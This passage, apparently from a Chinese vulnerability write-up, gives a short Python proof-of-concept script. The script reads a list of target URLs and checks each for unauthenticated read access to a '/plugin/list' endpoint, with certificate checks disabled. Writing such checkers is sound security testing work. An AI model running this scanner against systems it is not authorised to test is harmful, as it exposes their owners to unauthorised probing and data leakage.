## 三、POC

poc编写比较简单，只需要判断`/plugin/list`是否可读即可

```python
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
'''
@Project ：UzJuSecurityTools
@File ：poc.py
@Author ：UzJu
@Date ：2022/1/7 21:21
@Email ：UzJuer@163.com
'''
import requests

requests.packages.urllib3.disable_warnings()
requests.DEFAULT_RETRIES = 100


def checkVuln(url):
    poc = "/plugin/list"
    r = requests.get(url=url + poc, verify=False, timeout=3)
    if r.status_code == 200 and b"data" in r.content:
        print(f"[+]{url}-存在漏洞", r.content)
    else:
        print(f"[-]{url}-不存在漏洞")


if __name__ == '__main__':
    with open('./url.txt', 'r') as f:
        for url in f.read().splitlines():
            checkVuln(url)
```
